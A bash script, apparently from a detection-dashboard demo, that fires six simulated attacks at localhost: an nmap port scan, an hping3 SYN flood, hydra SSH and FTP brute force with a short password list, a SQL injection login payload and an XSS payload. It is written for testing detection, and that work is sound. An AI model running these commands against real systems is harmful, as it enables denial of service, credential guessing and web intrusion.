#!/bin/bash
# scripts/simulate_attacks.sh
#
# Generates 6 distinct attack-like traffic patterns against localhost ONLY,
# for triggering your live detection dashboard during the demo.
# Requires: nmap, hping3, hydra, curl (all standard pentest-lab tools).
# Run each block individually during your demo, narrating which attack
# you're triggering and watching it appear on the dashboard.
#
# NEVER point these at anything other than 127.0.0.1 / your own test server.

set -e
TARGET="127.0.0.1"
WEBAPP_PORT=8080   # point this at a local throwaway test app (e.g. DVWA)

echo "=== 1. Port Scan (PortScan) ==="
nmap -sS -p 1-1000 "$TARGET"

echo "=== 2. SYN Flood (DDoS) ==="
timeout 10 hping3 -S --flood -V "$TARGET"

echo "=== 3. SSH Brute Force (SSH-Patator) ==="
echo "root" > /tmp/user_list.txt
echo -e "password\n123456\nletmein\nadmin" > /tmp/pass_list.txt
hydra -L /tmp/user_list.txt -P /tmp/pass_list.txt "$TARGET" ssh || true

echo "=== 4. FTP Brute Force (FTP-Patator) ==="
hydra -L /tmp/user_list.txt -P /tmp/pass_list.txt "$TARGET" ftp || true

echo "=== 5. SQL Injection (Web Attack - Sql Injection) ==="
# Point WEBAPP_PORT at a local vulnerable test app, e.g. DVWA on Docker
curl -s "http://$TARGET:$WEBAPP_PORT/login.php" \
     --data "username=admin' OR '1'='1&password=x" > /dev/null

echo "=== 6. XSS (Web Attack - XSS) ==="
curl -s "http://$TARGET:$WEBAPP_PORT/comment.php" \
     --data "comment=<script>alert('xss')</script>" > /dev/null

echo "All 6 attack simulations sent. Check the dashboard's /live-alerts."